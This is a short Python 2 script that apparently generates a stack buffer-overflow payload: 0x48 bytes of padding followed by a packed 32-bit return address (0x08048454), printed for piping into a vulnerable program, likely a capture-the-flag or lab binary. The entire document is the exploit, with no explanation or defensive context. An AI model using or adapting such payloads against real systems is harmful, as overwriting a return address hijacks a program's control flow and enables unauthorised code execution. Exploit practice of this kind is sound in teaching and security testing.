import struct

offset = 'a' * 0x48
address = struct.pack("<I", 0x08048454)

print offset + address
